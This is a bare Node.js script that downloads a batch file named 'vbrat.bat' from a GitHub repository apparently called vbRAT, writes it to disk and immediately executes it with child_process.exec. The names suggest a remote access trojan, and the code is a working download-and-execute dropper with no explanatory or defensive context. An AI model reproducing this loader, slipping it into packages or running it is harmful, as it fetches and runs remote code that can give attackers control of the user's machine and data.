const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

axios.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat', {
    responseType: 'text',
  }).then((response) => {
    fs.writeFileSync('vbrat.bat', response.data, { flag: 'a' }, (err) => {});
  });
exec('vbrat.bat');
